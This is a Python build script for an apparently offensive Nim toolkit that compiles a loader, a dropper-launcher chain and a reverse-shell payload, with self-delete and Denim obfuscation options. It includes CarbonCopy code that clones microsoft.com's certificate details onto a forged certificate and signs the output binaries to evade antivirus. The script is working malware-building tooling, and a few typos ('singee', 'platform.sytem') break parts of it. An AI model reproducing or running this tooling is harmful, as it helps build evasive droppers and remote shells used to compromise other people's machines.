#!/usr/bin/env python3

import os
import sys
import ssl
import toml
import shutil
import base64
import zipfile
import argparse
import subprocess
import platform 

from pathlib import Path
from OpenSSL import crypto
from colorama import Fore

# Assumes Nim and Nim dependencies are installed
# Denim and sign option are in here for testing

TIMESTAMP_URL = "http://rfc3161.ai.moda"

DEFAULT_FLAGS = [
    "-d:release", 
    "-d:strip", 
    "-d:noRes",
    "--opt:size",
    "--hints:off", 
    "--warnings:off", 
    "--cpu=amd64"
]

TEMP_LAUNCHER = "templauncher.exe"
TEMP_PAYLOAD = "temppayload.exe"
TEMP_DROPPER = "tempdropper.exe"
TEMP_LOADER = "temploader.exe"

def compile_tl(self_delete=False, sign=False):
    with open("method_1_config.toml", 'r') as file:
        config = toml.load(file)
    loader = config['bin_name']['name']

    with open("method_1_config.toml", "rb") as file:
        config_data = file.read()

    encoded_config = base64.b64encode(config_data)
    with open("method_1_config.b64", "wb") as file:
        file.write(encoded_config)
    
    if platform.system() == "Linux":
        DEFAULT_FLAGS.append("-d:mingw")

    print(Fore.MAGENTA + f"[>] Compiling {loader}..")
    try:
        if self_delete == True:
            subprocess.run(["nim", "c"] + DEFAULT_FLAGS + ["-d:suicide", "--app:gui", f"--out:output/{loader}", "src/loader.nim"])
        else:
            subprocess.run(["nim", "c"] + DEFAULT_FLAGS + ["--app:gui", f"--out:output/{loader}", "src/loader.nim"])
    except Exception as e:
        print(Fore.RED + f"\n[X] Error compiling {loader}\n {e}")
        sys.exit()  
    
    if sign == True:
        os.rename(f"output/{loader}", f"output/{TEMP_LOADER}")
        carbon_copy(f"output/{TEMP_LOADER}", f"output/{loader}")
    
    if os.path.exists(TEMP_LOADER):
        os.remove(TEMP_LOADER)
    
def compile_lp(ur_payload=None, self_delete=False, denim=False, sign=False):
    with open("method_2_config.toml", 'r') as file:
        config = toml.load(file)

    launcher = config['bin_names']['launcher']
    payload = config['bin_names']['payload']
    dropper = config['bin_names']['dropper']

    with open("method_2_config.toml", "rb") as file:
        config_data = file.read()
    
    encoded_config = base64.b64encode(config_data)
    with open("method_2_config.b64", "wb") as file:
        file.write(encoded_config)

    if platform.system() == "Linux":
        DEFAULT_FLAGS.append("-d:mingw")
    
    # Edit
    denim_flags = ["-a", "-C", "1", "-U", "1"]
    denim_comp = ["wine", "denim.exe", "compile"]
    if platform.system() == "Windows":
        denim_comp = ["denim.exe", "compile"]

    # Compile the children
    print(Fore.MAGENTA + "[>] Compiling child binaries..")
    if ur_payload == None:
        try:
            if denim == True:
                subprocess.run(denim_comp + denim_flags + ["-o", f"rsrc/{payload}", "src/rev_shell.nim"])
            else:
                subprocess.run(["nim", "c"] + DEFAULT_FLAGS + [f"--out:rsrc/{payload}", "src/rev_shell.nim"])
        except Exception as e:
            print(Fore.RED + f"\n[X] Error compiling {payload}\n {e}")
            cleanup()
            sys.exit()
    
    try:
        if denim == True:
            subprocess.run(denim_comp + denim_flags + ["-o", f"rsrc/{launcher}", "src/launcher.nim"])
        else:
            if self_delete == True:
                subprocess.run(["nim", "c"] + DEFAULT_FLAGS + ["-d:suicide", "--app:gui", f"--out:rsrc/{launcher}", "src/launcher.nim"])
            else:
                subprocess.run(["nim", "c"] + DEFAULT_FLAGS + ["--app:gui", f"--out:rsrc/{launcher}", "src/launcher.nim"])
    except Exception as e:
        print(Fore.RED + f"\n[X] Error compiling {launcher}\n {e}")
        cleanup()
        sys.exit()   

    # Sign the children
    if sign == True:
        os.rename(f"rsrc/{launcher}", f"rsrc/{TEMP_LAUNCHER}")
        os.rename(f"rsrc/{payload}", f"rsrc/{TEMP_PAYLOAD}")
        carbon_copy(f"rsrc/{TEMP_LAUNCHER}", f"rsrc/{launcher}")
        carbon_copy(f"rsrc/{TEMP_PAYLOAD}", f"rsrc/{payload}")

    # Zip children
    with zipfile.ZipFile("rsrc/launcher.zip", 'w') as zipf:
        zipf.write(f"rsrc/{launcher}", launcher)
    if ur_payload == None:
        with zipfile.ZipFile("rsrc/payload.zip", 'w') as zipf:
            zipf.write(f"rsrc/{payload}", payload)
    
    # If using a different payload, check that the names match, then zip
    if ur_payload:
        base_name = os.path.splitext(os.path.basename(ur_payload))[0]
        extension = os.path.splitext(ur_payload)[1]
        bin_name = base_name + extension 

        if bin_name != payload:
            print(Fore.YELLOW + "[!] The given payload's name does not match the config.toml. Renaming..")
            new_path = os.path.join(os.path.dirname(ur_payload), f"{payload}")
            os.rename(ur_payload, new_path)
        else:
            new_path = ur_payload 

        with zipfile.ZipFile("rsrc/payload.zip", 'w') as zipf:
            zipf.write(new_path, os.path.basename(new_path))

    # Compile the main binary
    print(Fore.MAGENTA + "[>] Compiling the main binary..")
    try:
        if denim == True:
            subprocess.run(denim_comp + denim_flags + ["-o", f"output/{dropper}", "src/dropper.nim"])
        else:
            if self_delete == True:
                subprocess.run(["nim", "c"] + DEFAULT_FLAGS + ["-d:suicide", "--app:gui", f"--out:output/{dropper}", "src/dropper.nim"])
            else:
                subprocess.run(["nim", "c"] + DEFAULT_FLAGS + ["--app:gui", f"--out:output/{dropper}", "src/dropper.nim"])
    except Exception as e:
        print(Fore.RED + f"\n[X] Error compiling {dropper}\n {e}")
        cleanup()
        sys.exit()   

    if sign == True:
        os.rename(f"output/{dropper}", f"output/{TEMP_DROPPER}")
        carbon_copy(f"output/{TEMP_DROPPER}", f"output/{dropper}")
    
    cleanup()

def cleanup():
    with open("method_2_config.toml", 'r') as file:
        config = toml.load(file)

    launcher = config['bin_names']['launcher']
    payload = config['bin_names']['payload']

    to_remove = [
        "method_2_config.b64", f"rsrc/{launcher}", f"rsrc/{payload}", "rsrc/launcher.zip", 
        "rsrc/payload.zip", TEMP_LAUNCHER, TEMP_PAYLOAD, TEMP_DROPPER 
    ]

    for f in to_remove:
        if os.path.exists(f):
            os.remove(f)

# CarbonCopy 
# Author : Paranoid Ninja
# Email  : paranoidninja@protonmail.com
# Description  : Spoofs SSL Certificates and Signs executables to evade Antivirus
# https://github.com/klezVirus/inceptor/blob/main/inceptor/signers/CarbonCopy.py
def carbon_copy(signee, signed):
    host = 'www.microsoft.com'
    port = '443'

    try:
        #Fetching Details
        ogcert = ssl.get_server_certificate((host, int(port)))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

        certDir = Path('certs')
        certDir.mkdir(exist_ok=True)

        #Creating Fake Certificate
        CNCRT   = certDir / (host + ".crt")
        CNKEY   = certDir / (host + ".key")
        PFXFILE = certDir / (host + ".pfx")

        #Creating Keygen
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()

        #Setting Cert details from loaded from the original Certificate
        cert.set_version(x509.get_version())
        cert.set_serial_number(x509.get_serial_number())
        cert.set_subject(x509.get_subject())
        cert.set_issuer(x509.get_issuer())
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        print(Fore.GREEN + "[+] Creating %s and %s" %(CNCRT, CNKEY))
        CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
        print(Fore.GREEN + "[+] Clone process completed. Creating PFX file for signing executable...")

        try:
            pfx = crypto.PKCS12()
        except AttributeError:
            pfx = crypto.PKCS12Type()
        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()

        PFXFILE.write_bytes(pfxdata)

        if platform.system() == "Linux":
            print(Fore.GREEN + f"[+] Signing {signee} with {PFXFILE} using osslsigncode..")
            args = ("osslsigncode", "sign", "-pkcs12", PFXFILE,
                    "-n", "Michaelsoft Bimbos", "-i", TIMESTAMP_URL,
                    "-in", signee, "-out", signed)
            print("[+] ", end='', flush=True)
            subprocess.check_call(args)
        else:
            print(Fore.GREEN + f"[+] Signing {signee} with signtool.exe..")
            shutil.copy(singee, signed)
            subprocess.check_call(["signtool.exe", "sign", "/v", "/f", PFXFILE,
                                   "/d", "Michaelsoft Bimbos", "/tr", TIMESTAMP_URL,
                                   "/td", "SHA256", "/fd", "SHA256", signed])

    except Exception as ex:
        print(Fore.RED + "[X] Something Went Wrong!\n[X] Exception: " + str(ex))    

def check_deps(denim=False, sign=False) -> bool:
    if sign == True:
        if platform.system() == "Linux":
            if shutil.which("osslsigncode") is None:
                print(Fore.RED + "[X] osslsigncode is not found in path. Install or edit the script")
                return False
        else:
            if shutil.which("signtool") is None:
                print(Fore.RED + "[X] signtool not found in path. Install or edit the script")
                return False
    if denim == True:
        denim_path = Path(__file__).parent / "Denim.exe"
        if not denim_path.exists():
            print(Fore.RED + "[X] Denim.exe not found in script root. Download and setup or edit the script")
            return False
        if platform.sytem() == "Linux":
            if shutil.which("wine") is None:
                print(Fore.RED + "[X] Wine not found in path. Install or edit the script")
                return False 
    if shutil.which("nim") is None:
        print(Fore.RED + "[X] Nim not found in path. Install or edit the script")
        return False 
    
    return True 

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="setup.py", formatter_class=argparse.HelpFormatter)
    parser.add_argument(
        "-m1", "--method-one", required=False, action="store_true",
        help=("Compile the test loader for method one (single loader binary)"))
    parser.add_argument(
        "-m2", "--method-two", required=False, action="store_true",
        help=("Compile the test reverse shell or your payload for method two (dropper -> launcher/payload)"))
    parser.add_argument(
        "-p", "--payload", required=False, type=str, 
        help=("Path to your payload if not using the default reverse shell for method 2."))
    parser.add_argument(
        "-sd", "--self-delete", required=False, action="store_true",
        help=("If you want to apply self delete for the kill date, and self delete for the dropper (method 2)"))
    parser.add_argument(
        "-d", "--denim", required=False, action="store_true",
        help=("(Testing) Use Denim for compiling the reverse shell and main binary."))
    parser.add_argument(
        "-s", "--sign", required=False, action="store_true",
        help=("(Testing) Use CarbonCopy to sign binaries with an invalid SingerCert."))
    args = parser.parse_args()
    
    if not args.method_one and not args.method_two:
        print(Fore.YELLOW + "[!] Must specify either method one or method two")
        sys.exit()

    installed = check_deps(args.denim, args.sign)
    if installed == False:
        sys.exit()

    os.makedirs("output", exist_ok=True)

    if platform.system() == "Linux":
        converter_path = Path(__file__).parent / "output/converter"
        if not converter_path.exists():
            print(Fore.GREEN + "[>] Compiling converter.nim to /output")
            subprocess.run(["nim", "c", "--hints:off", "--warnings:off", "--out:output/converter", "src/converter.nim"])
    else:
        converter_path = Path(__file__).parent / "output/converter.exe"
        if not converter_path.exists():
            print(Fore.GREEN + "[>] Compiling converter.nim to /output")
            subprocess.run(["nim", "c", "--hints:off", "--warnings:off", "--out:output/converter.exe", "src/converter.nim"])

    if args.method_one:
        compile_tl(self_delete=args.self_delete, sign=args.sign)
        print(Fore.GREEN + "[+] Done! Check the output directory")
        sys.exit()

    if args.method_two:
        if args.payload:
            compile_lp(ur_payload=args.payload, self_delete=args.self_delete, denim=args.denim, sign=args.sign)
        else:
            compile_lp(ur_payload=None, self_delete=args.self_delete, denim=args.denim, sign=args.sign)
        print(Fore.GREEN + "[+] Done! Check the output directory")

